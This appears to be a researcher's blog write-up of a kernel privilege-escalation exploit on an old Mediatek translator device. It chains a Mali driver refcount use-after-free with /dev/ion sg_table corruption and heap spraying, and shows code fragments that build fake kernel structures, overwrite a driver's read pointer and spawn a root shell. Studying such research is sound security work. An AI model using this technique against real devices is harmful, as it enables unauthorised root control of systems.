---
published: true
title: "🗺️ [2] 2 Drivers, 1 Exploit"
toc: true
toc_sticky: true
tagline: "In this blog I exploit the mali Utgard refcount decrement to abuse /dev/ion structures, yielding arbitrary read/write in the kernel, allowing me to finally pop a root shell on the translator!"
windowGradientStart: rgb(0, 11, 130)
windowGradientEnd: rgb(8, 0, 165)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(47, 255, 0)
maximizeButton: rgb(255, 162, 0)
closeButton: rgb(255, 0, 0)
tags:
  - Linux Kernel Driver
  - Binary Exploitation
  - Android LPE
---

It was at this point I decided to leave the country for 3 months, and left the translator at home, so this project got put on hold for a while. However, I did take the kernel with me, which meant I could mindlessly stare at it in Ghidra to find some possible objects to leverage - if you have no idea what I am talking about, read the last blog!

# Finding Targets

We need objects with something useful at offset *76*, me and Claude knocked up a simple Ghidra script to locate calls to **kzalloc** and **kmalloc**, and filtered allocations by their size. As we are able to decrement the offset at 76, we need structures that are of size between 80 and 128. The reason for the 128 limit is because the object that gets freed for the UAF is in the **kmalloc-128** cache, so we need something that will go into the freed slot within **kmalloc-128**.

Also, I did some searching and found the source code for the Mediatek 3.18 Linux Kernel that seems to be used for this device (or at least is very similar). So the strategy for finding possible objects is as follows:
- Use the script to find allocations that fit the desired range
- Find strings that let us match the decompiled code to the source code
- Check if the functions are reachable from our current context, ideally looking for allocations that result from system calls in the kernel

## The First Glimmer of Hope: **ring_buffer**

I was browsing through the results, and I came across a function called **__ring_buffer_alloc**:

```c
struct ring_buffer *__ring_buffer_alloc(unsigned long size, unsigned flags,
					struct lock_class_key *key)
{
	struct ring_buffer *buffer;
	int bsize;
	int cpu, nr_pages;

	/* keep it in its own cache line */
	buffer = kzalloc(ALIGN(sizeof(*buffer), cache_line_size()),
			 GFP_KERNEL);
	if (!buffer)
		return NULL;

	if (!alloc_cpumask_var(&buffer->cpumask, GFP_KERNEL))
		goto fail_free_buffer;

	nr_pages = DIV_ROUND_UP(size, BUF_PAGE_SIZE);
	buffer->flags = flags;
	buffer->clock = trace_clock_local;
	buffer->reader_lock_key = key;

	init_irq_work(&buffer->irq_work.work, rb_wake_up_waiters);
	init_waitqueue_head(&buffer->irq_work.waiters);
	...
}
```

Which looks like this in Ghidra (inside of **allocate_trace_buffer** as it seems to be inlined):

```c
astruct_34 * allocate_trace_buffer(int param_1,int param_2,int param_3)

{
  astruct_34 *buffer;
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  uint uVar4;
  
  buffer = (astruct_34 *)kzalloc(_DAT_c112553c,0x80d0,0x80);
  if (buffer == (astruct_34 *)0x0) {
    return (astruct_34 *)0x0;
  }
  buffer->field0_0x0 = param_2;
  buffer->field11_0x14 = param_3;
                    /* there is hope? */
  buffer->field46_0x4c = FUN_c01afec0; // irq_work?
  buffer->field40_0x40 = FUN_c01af9fc; // clock?
  ...
}
```

If we take a look at the **ring_buffer** structure, and the structures it contains:

```c
struct ring_buffer {
	unsigned			flags;
	int				cpus;
	atomic_t			record_disabled;
	atomic_t			resize_disabled;
	cpumask_var_t			cpumask;
	struct lock_class_key		*reader_lock_key;
	struct mutex			mutex;
	struct ring_buffer_per_cpu	**buffers;
#ifdef CONFIG_HOTPLUG_CPU
	struct notifier_block		cpu_notify;
#endif
	u64				(*clock)(void);
	struct rb_irq_work		irq_work;
};
```

```c
struct rb_irq_work {
	struct irq_work			work;
	wait_queue_head_t		waiters;
	wait_queue_head_t		full_waiters;
	bool				waiters_pending;
	bool				full_waiters_pending;
	bool				wakeup_full;
};
```

```c
struct irq_work {
	unsigned long flags;
	struct llist_node llnode;
	void (*func)(struct irq_work *);
};
```

As **clock** is earlier in the structure, it is safe to assume that the function pointer at an offset of *0x40* is this. The later function is the **fun** in the **irq_work** structure inside of the **ring_buffer** structure. Which means there is a chance we have found a nice function pointer to modify to manipulate execution!

### Or Not...

Cool, now we have a hopeful target, lets actually understand when the code is triggered, and if we are able to cause the allocation from userspace.

Tracing the code up, I found that it was in the **kernel/trace.c** file, which is, at a high level, for debugging the kernel. As you can imagine, this is probably something you don't want an untrusted user to be able to interact with.

If we could access the **/sys/kernel/debug/tracing/instances/** directory, and could create a directory within in, we would be able to cause the allocation of the trace buffer, and possibly modify the **irq_work** function to execute something useful. Unfortunately, we do not have permissions to create directories within the **/sys/kernel/debug/tracing/instances/** directory - so unfortunately that is the end of this for now!

![change_of_plan.jpg](/assets/images/translator/p3/change_of_plan.jpg)

## Second Glimmer of Hope: **ion_buffer**

I couldn't find any other obvious function pointers in structures at this offset so I went back to the drawing board. Eventually, I came across the **ion_buffer** object in our old friend **/dev/ion**. 

We can use **ioctl** calls on **/dev/ion** to get a call to **ion_buffer_create** which allocates an **ion_buffer**, which happens to land in the same cache as the **mali_mem_allocation** object:

```c
struct ion_buffer {
	struct kref ref;
	union {
		struct rb_node node;
		struct list_head list;
	};
	struct ion_device *dev;
	struct ion_heap *heap;
	unsigned long flags;
	unsigned long private_flags;
	size_t size;
	union {
		void *priv_virt;
		ion_phys_addr_t priv_phys;
	};
	struct mutex lock;
	int kmap_cnt;
	void *vaddr;
	int dmap_cnt;
	struct sg_table *sg_table; // SPOILER: We can decrement this
	struct page **pages;
	struct list_head vmas;
	/* used to track orphaned buffers */
	int handle_count;
	char task_comm[TASK_COMM_LEN];
	pid_t pid;
};
```

The **ion_ioctl** function is tied to the **ion_fops** for the **/dev/ion** device:

```c
static const struct file_operations ion_fops = {
	.owner          = THIS_MODULE,
	.open           = ion_open,
	.release        = ion_release,
	.unlocked_ioctl = ion_ioctl,
	.compat_ioctl   = compat_ion_ioctl,
};
```

```c
idev->dev.minor = MISC_DYNAMIC_MINOR;
idev->dev.name = "ion";
idev->dev.fops = &ion_fops;
idev->dev.parent = NULL;
ret = misc_register(&idev->dev);
```

So this checks the first checkbox, that we can trigger it from the adb shell, as anything can interact with the **/dev/ion** device. Now we need to work out if we can do anything interesting with it!

Lets have a look at the **ion_buffer_create** function in Ghidra, and see what lies at the offset we can manipulate:

```c
...
mutex_init(&allocation->field16_0x28,s_&buffer->lock_c 0de89ec,&DAT_c12e5448);
puVar6 = (uint *)*allocation->sg_table_0x4c;
if (allocation->sg_table_0x4c[1] != 0) {
	uVar11 = 0;
	do {
	uVar11 = uVar11 + 1;
	puVar6[3] = puVar6[1] +
				(((int)((*puVar6 & 0xfffffffc) - _DAT_c1129e00 ) >> 5) + 0x80000) *
				0x1000;
	puVar6 = (uint *)FUN_c0375a98(puVar6);
	} while (uVar11 < (uint)allocation->sg_table_0x4c[1]);
}
...
```

And here is that same code in the source code:

```c
...
mutex_init(&buffer->lock);
for_each_sg(buffer->sg_table->sgl, sg, buffer->sg_table->nents, i) {
	sg_dma_address(sg) = sg_phys(sg);
	#ifdef CONFIG_NEED_SG_DMA_LENGTH
	sg->dma_length = sg->length;
	#endif
}
...
```

I already named it in Ghidra, but it was clear by locating the **mutex_init** that the object wthin the struct at offset *76* is the **sg_table** structure (as I highlighted in the structure definition earlier).

### **sg_table**

So we may be able to get an allocation of an **ion_buffer**, and decrement the **sg_table** object. But what is that object actually for?

It is a really simple structure:

```c
struct sg_table { 
	struct scatterlist *sgl; 
	unsigned int nents; 
	unsigned int orig_nents; 
};
```

It has a pointer to a **scatterlist**, and a couple of entry counts. Lets now take a look at the **scatterlist** structure:

```c
struct scatterlist {
    unsigned long page_link;
    unsigned int offset;
    unsigned int length;
    dma_addr_t dma_address;
};
```

I had a browse and found a [super useful blog post](https://github.blog/security/vulnerability-research/the-android-kernel-mitigations-obstacle-race/) which identified this **sg_table** structure as a useful corruption target, and also gave a bit more detail on how it works, and the primitives we can get by corrupting it - my personal highlight is this:

> \> *When mmap is called, the page encoded by page_link will be mapped to user space*

![stay_calm.gif](/assets/images/translator/p3/stay_calm.gif)

# Background

I don't know a huge amount about the kernel right now (especially as this is the first one I have written an exploit for), so lets talk kernel.

## kmalloc Caches

Before jumping into the exploit, it is important to understand how the heap is working on this device, as we will likely have to spray fake objects onto the heap to get execution.

With the source code, and the kernel open in Ghidra, I found the **create_kmalloc_caches** function that creates the **kmalloc-X** caches for the kernel allocations:


```c
  i = 6;
  ...
  do {
    iVar2 = DAT_c0f15870;
    if (*(int *)(iVar5 + i * 4) == 0) {
      uVar3 = create_kmalloc_cache(0,1 << (i & 0xff),param_1);
      *(undefined4 *)(iVar5 + i * 4) = uVar3;
    }
    if ((*(int *)(iVar5 + 8) == 0) && (i == 7)) {
      uVar3 = create_kmalloc_cache(0,0xc0,param_1);
      *(undefined4 *)(iVar5 + 8) = uVar3;
    }
    i = i + 1;
  } while (i != 0xe);
```

With this code, we can see the size of the caches we are working with:

- kmalloc-64
- kmalloc-128
- kmalloc-192
- kmalloc-256
- kmalloc-512
- kmalloc-1024
- kmalloc-2048
- kmalloc-4096
- kmalloc-8192

When an allocation happens with **k\*alloc**, it will pick the cache with the smallest size that will fit the object. 

This kernel is very old (2014?), so there won't be any crazy mitigations on the heap, meaning sprays *should* be pretty straightforward.

The **create_kmalloc_caches** function loaded into Ghidra also tells us that list of **kmalloc** cache pointers is stored at *0xC1125520* - which is handy to know.

## Mitigations

As I just mentioned, this kernel and MCU are very old so we won't need to worry about much, it is easy to tell from the kernel that there is no KASLR. Therefore if we manage to get an arbitrary write with this method we should be golden.

![easy_money.gif](/assets/images/translator/p3/easy_money.gif)

The difficult part is going to be manipulating the heap to make our decrement useful, while also hitting the UAF...

# Exploit Plan

Lets just go over the full plan thus far, and understand how we can win, we need to do the following:
1. Allocate a **mali_mem_allocation** structure using **MALI_IOC_MEM_ALLOC** **ioctl**
2. **mmap** it loads of times to increase the refcount to the amount we want to decrement
3. Repeatedly call **MALI_IOC_MEM_UNBIND** on the memory to decrement the refcount
4. As the **kmalloc-128** cache is pretty hot, will have to race the last **MALI_IOC_MEM_UNBIND** call that will free the **mali_mem_allocation** object, and the **ION_IOC_ALLOC** **ioctl** that will hopefully allocate an **ion_buffer** in its place
5. Now we have a bunch of **mmap**'d memory, and the **vma->vm_private_data** of them are now pointing to the **ion_buffer**, we can now trigger **mali_mem_vma_close** for each **mmap**'d memory instance to decrement the **sg_table** pointer inside of the **ion_buffer**
6. Assume for now we magically decremented the pointer to perfectly point to a fake **sg_table** we control, and have also magically placed a fake **scatterlist** somewhere known as well
7. We call **mmap** to map the page specified in the **scatterlist** into userspace
8. Write some memory and get root!

There are a couple of things we need to check before we take this further:
1. What is the value in **sg_table**? We have limited decrements, which means we ideally need a heap pointer here as a starting point
2. How can we spray the heap such that we can both get an **sg_table** somewhere useful, and also get a fake **scatterlist** somewhere we can predict (as we need to have a pointer to it in the **sg_table** struct)

## **sg_table** Pointer Original Value

In **ion_buffer_create**, the **sg_table** pointer comes from **table = heap->ops->map_dma(heap, buffer);**
- Lets assume for now that we are using an **ion_system_heap**, so the function that gets called is **ion_system_heap_map_dma**:

```c
static struct sg_table *ion_system_heap_map_dma(struct ion_heap *heap,
						struct ion_buffer *buffer)
{
	return buffer->priv_virt;
}
```

And this **priv_virt** value is set in the **alloc** function for the system heap (**ion_system_heap_allocate**) which is called earlier on in the creation of the **ion_buffer**

Here is the relevant snippet:

```c
...
	table = kmalloc(sizeof(struct sg_table), GFP_KERNEL);
	if (!table)
		goto free_pages;

	if (sg_alloc_table(table, i, GFP_KERNEL))
		goto free_table;

	sg = table->sgl;
	list_for_each_entry_safe(page, tmp_page, &pages, lru) {
		sg_set_page(sg, page, PAGE_SIZE << compound_order(page), 0);
		sg = sg_next(sg);
		list_del(&page->lru);
	}

	buffer->priv_virt = table;
...
```

As the size of the **sg_table** is *<= 64*, it will be placed into the **kmalloc-64** cache, the smallest on the device. This means we should be able to decrement it to point to something else allocated in the **kmalloc-64** cache!

![kmalloc_meme.png](/assets/images/translator/p3/kmalloc_meme.png)

## Heap Spray Plan

Now we know the **sg_table** will be a pointer into the **kmalloc-64** cache, we can begin to explore how we can groom the heap in such a way that we can map arbitrary memory into userspace. 

This smaller caches will be pretty hot (lots of allocations and frees constantly) which might reduce the reliability of our spray, but we should be able to get a successful attempt once in a while.

The plan is to do something like this:

![heap_spray.png](/assets/images/translator/p3/heap_spray.png)

If we get a bunch of fake **sg_table** structures allocated in the **kmalloc-64** cache, and then open holes in the heap, the legit **sg_table** should be allocated into one of these holes. We can then perform the decrement to change the **sg_table** from the legit one, to the nearby object.

# The Exploit

I'll walk through the exploit, and explain what each part is doing - explaining everything as I go. I also developed this without root (fancied a challenge), so all I had to debug was the **last_kmsg** after it crashed.

## Setting Up

- Open the **/dev/mali** and **/dev/ion** devices so we can perform the **ioctl**'s
- Perform the allocation of the victim **mali_mem_allocation** object, this is the object we will be freeing early
- Now **mmap** the allocated buffer multiple times so that we have a bunch of **vma->vm_private_data** set to the victim **mali_mem_allocation** object

## Heap Spray

For the spray, I needed to be able to keep the fake **sg_table** pointers in **kmalloc-64** so that I could free a few of them to create holes in **kmalloc-64**. To do this I use **sendmsg** to spray and then immediately free, and then pin the stale data in place by creating an **ion_buffer**, which allocates an **sg_table** of size smaller than the **kmalloc-64** max size, meaning the **sendmsg** contents I sprayed sticks into memory (other allocations might also do this as the heap is very active, fine by me as long as the **sendmsg** data sticks around) - pinning sounds like the correct term for this. This sorted out the transient heap spray in **kmalloc-64**.

![minnka_heap_spray.png](/assets/images/translator/p3/minnka_heap_spray.png)

At this point, we can now free a few of the allocated **ion_buffer** objects and their associated **sg_table** objects to create holes in the **kmalloc-64** for our UAF **ion_buffer** to place its legitimate **sg_table** (the pointer to which we will decrement)!

However, we also need to be able to hit the UAF in **kmalloc-128**, and for some reason after the **ion_buffer** spray was being sent, and the holes were being created, it wasn't landing anymore. I figured that all of the activity in the **kmalloc-128** cache was messing up the allocation ordering, and we were no longer getting given memory in the target **mali_alloc** free space. So to get around this, every time I created a hole, I did another **MALI_IOC_MEM_ALLOC** that allocates an underlying **mali_alloc** object to occupy the freed **ion_buffer** - keeping the heap state a bit more consistent.

![minnka_heap_spray_holes.png](/assets/images/translator/p3/minnka_heap_spray_holes.png)

In my head, this shouldn't make a difference, as the victim **mali_alloc** should be put on the freelist and be offered on the next allocation, no matter what was just freed - but this magically worked!

![minnka_heap_spray_ion_buffer_alloc.png](/assets/images/translator/p3/minnka_heap_spray_ion_buffer_alloc.png)

## Triggering Bug to Hijack **sg_table** Pointer

Now that we have sprayed such that:
- We trigger the UAF in **kmalloc-64**
- The UAF **ion_buffer**'s **sg_table** lands in a hole near controlled memory

We are able to trigger the decrement of the **ion_buffer**'s **sg_table** by calling **munmap** on the **mali** memory that we mapped at the start.

Here is an example of me decrementing by an odd amount (to trigger a crash when we attempt to **mmap** the UAF **ion_buffer** memory), luckily I had register values in the **last_kmsg**, and *r10* contains the pointer we decremented - meaning I can see what the pointer we modified is pointing at. The following example shows us successfully landing in a hole in **kmalloc-64**, where **sendmsg** was used to spray *0x61*'s:

![sendmsg_pin_worked.png](/assets/images/translator/p3/sendmsg_pin_worked.png)

This means we can decrement the legit **sg_table** to point to controlled data!

![minnka_heap_spray_decremented.png](/assets/images/translator/p3/minnka_heap_spray_decremented.png)

## Mapping Arbitrary Kernel Memory to Userspace

So, at this point we have used our spray to get control of a pointer to an **sg_table** - now what? 

Well, this kernel doesn't have PXN/PAN (ARMs version of SMEP/SMAP), meaning we can simply put a userspace pointer into the fake **sg_table** that we spray. So we can define the **scatterlist** that will tell the kernel what memory to map in userspace, and put this into the fake **sg_table**.

```c
// construct fake scatterlist object (fake sg_table will point to this)
struct scatterlist fake_scatterlist;
fake_scatterlist.page_link = page_link;
fake_scatterlist.offset = 0;
fake_scatterlist.length = 0x1000;
fake_scatterlist.dma_address = 0x0;

// construct fake sg_table object (we will modify legit pointer to point to this)
struct sg_table fake_sg_table;
fake_sg_table.sgl = &fake_scatterlist;
fake_sg_table.nents = 1;
fake_sg_table.orig_nents = 1;
```

The biggest pain on this part was figuring out how to get the **page_link** value, which is just a pointer to a **struct page** object in the kernel. I needed to find the following:
- **mem_map**
- **ARCH_PFN_OFFSET**

I basically had to find an instance of the following code in my kernel, and do the opposite:

```c
#define __page_to_pfn(page) \
    ((unsigned long)((page) - mem_map) + ARCH_PFN_OFFSET)
```

After a bit of searching, I found a function called **mm_page_pcpu_drain** which logged **page** and **pfn** values:

![mm_page_pcpu_drain.png](/assets/images/translator/p3/mm_page_pcpu_drain.png)

This tells me two things:
- The size of the page struct is *0x20* (from the **>> 5**)
- **ARCH_PFN_OFFSET** is *0x80000*

This doesn't give us the direct value of **mem_map**, just the address that is is stored at (and it gets set via some weirdly complicated memory init code). I ended up getting lucky and discovering the **mem_map** value in *r3* when I provided a corrupted **scatterlist** pointer (*0x41414141*):

![map_base.png](/assets/images/translator/p3/map_base.png)

So that is all of the pieces of the puzzle to calculate the **struct page** pointer we need:

```c
struct page *page = (struct page *)(MEM_MAP_BASE + (TARGET_PFN - 0x80000) * 32);
unsigned long page_link = (unsigned long)page;
```

**TARGET_PFN** is the frame number of the page we want to read - basically just the physical address shifted left by the page size (in this case, *0x1000*). And as there is no KASLR, you can just take a virtual address and replace the *0xc* at the start with a *0x8* and you'll be sorted. So for example, if I wanted to read out *0xc0b8c000* to *0xc0b8d000*, I'd specify a **pfn** of *0x80b8c*, exactly as I do in my exploit!

With that implemented, lets read some memory!

![mapped_kernel_memory.png](/assets/images/translator/p3/mapped_kernel_memory.png)

## Popping Root Shell

As I mentioned earlier, no PXN/PAN or other mitigations, so it is just a case of getting execution, and calling **commit_creds(prepare_kernel_cred(NULL));** to elevate the current process to root.

![relax.gif](/assets/images/translator/p3/relax.gif)

I figured the easiest approach was to patch the **fops** table for a quiet driver we can access, I'm not sure how heavily the **mali**/**ion** drivers are used, but I know for a fact that the **fts_ta** driver isn't getting used by anything as it isn't enabled, so I found the **read** syscall for it (which usually returns an error as the *touch analysis* feature is disabled) and patched it to get control of execution:

![kernel_pc_control.png](/assets/images/translator/p3/kernel_pc_control.png)

Now all we need to do is find the **commit_creds** and **prepare_kernel_cred** functions in our kernel, which I did by using the occasional string they left in, and comparing against source code for the **android-mtk-3.18** kernel I found online. Once found, I added a function to my exploit to be executed by the kernel:

```c
// Hardcoded kernel symbol addresses
#define PREPARE_KERNEL_CRED_ADDR 0xc013fbe4
#define COMMIT_CREDS_ADDR        0xc013f638

typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);

// function to be executed by the kernel to escalate privileges
void get_root_shell() {
    prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;
    commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;

    commit_creds(prepare_kernel_cred(NULL));
}
```

Then changed the target **pfn** to be that of the page that contains the pointer (*0x80b8c*), therefore letting me map the page to userspace and patch the **read** entry in the **fts_ta** **fop** table:

```c
if (map_ion_buffer(ion_fd, &ion_buffers_for_tracking[i]) == 0) {
	// Hexdump the mapped buffer contents
	if (ion_buffers_for_tracking[i].mapped_addr && ion_buffers_for_tracking[i].size > 0) {
		printf("[+] ION buffer %u first 0x80 bytes:\n", i);
		hexdump(ion_buffers_for_tracking[i].mapped_addr, 0x80, "    ");
		
		printf("[9] Attempting to overwrite fts_ta read pointer...\n");
		uint32_t* thing = (uint32_t*) ion_buffers_for_tracking[i].mapped_addr;
		thing[0x89c / 4] = &get_root_shell;
	}
}
```

Once in place, we can simply use the **read** syscall on the **/proc/fts_ta** device to elevate to root, and then pop our shell!

```c
if (getuid() == 0) {
	char* shell = "/system/bin/sh";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
} else {
	printf("[-] Utgard won the battle but not the war... try again\n");
}
```

And now, what you've all been waiting for:

![minnka.gif](/assets/images/translator/p3/minnka.gif)

Why *Minnka*? Apparently, it is old nordic for 'make smaller' (Utgard is also old nordic), which fits with the decrement primitive we leverage for root!

# Conclusion

Well, we got there in the end! Another project of firsts:
- First 0-day in something sort of useful
- First Android LPE (no mitigations was VERY useful for this)

I had a bunch of fun doing this, and I learnt loads of new things, which as always is the entire point!

## Shout Outs

Thanks to the following people who let me yap and worked through ideas with me when this rubbish wasn't working:
- [sam4k](https://sam4k.com/)
- [CUB3D](https://cub3d.pw/)

![real_one.gif](/assets/images/translator/p3/real_one.gif)